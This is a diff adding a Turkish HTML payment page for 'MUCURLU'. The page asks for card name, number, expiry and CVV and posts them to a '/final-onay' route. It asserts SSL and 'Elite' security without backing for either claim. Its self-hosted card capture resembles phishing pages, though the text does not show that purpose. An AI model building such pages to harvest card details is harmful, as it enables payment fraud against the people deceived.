@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenli Ödeme | MUCURLU</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --kirmizi: #e60000; --siyah: #1a1a1a; --gri: #f4f4f4; }
+        body { font-family: 'Inter', sans-serif; background: var(--gri); margin: 0; padding: 15px; }
+        .kart-konteynir { background: white; border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        .baslik { text-align: center; margin-bottom: 25px; }
+        .baslik h2 { font-size: 20px; color: var(--siyah); margin-bottom: 5px; }
+        .banka-logolar { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; color: #ccc; font-size: 20px; }
+        .input-grup { margin-bottom: 15px; }
+        label { display: block; font-size: 12px; font-weight: bold; color: #666; margin-bottom: 5px; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; border: 1.5px solid #eee; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: var(--kirmizi); outline: none; box-shadow: 0 0 8px rgba(230,0,0,0.1); }
+        .kart-alt { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .odeme-btn { background: var(--siyah); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        .guvenlik-notu { text-align: center; font-size: 11px; color: #999; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="kart-konteynir">
+        <div class="baslik">
+            <h2>GÜVENLİ ÖDEME</h2>
+            <p style="font-size: 13px; color: #888;">Sayın {{ ad_soyad }}, işleminiz 256-bit SSL ile korunmaktadır.</p>
+        </div>
+        <div class="banka-logolar">
+            <i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i> <i class="fab fa-cc-amex"></i>
+        </div>
+        <form action="/final-onay" method="POST">
+            <div class="input-grup">
+                <label>Kart Üzerindeki İsim</label>
+                <input type="text" placeholder="AD SOYAD" required>
+            </div>
+            <div class="input-grup">
+                <label>Kart Numarası</label>
+                <input type="text" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+            <div class="kart-alt">
+                <div class="input-grup">
+                    <label>Son Kullanma</label>
+                    <input type="text" placeholder="AA/YY" maxlength="5" required>
+                </div>
+                <div class="input-grup">
+                    <label>CVV</label>
+                    <input type="password" placeholder="***" maxlength="3" required>
+                </div>
+            </div>
+            <button class="odeme-btn">{{ toplam }} ₺ ÖDE</button>
+        </form>
+        <div class="guvenlik-notu">
+            <i class="fas fa-lock"></i> Bu ödeme altyapısı MUCURLU Elite güvencesindedir.
+        </div>
+    </div>
+</body>
+</html>
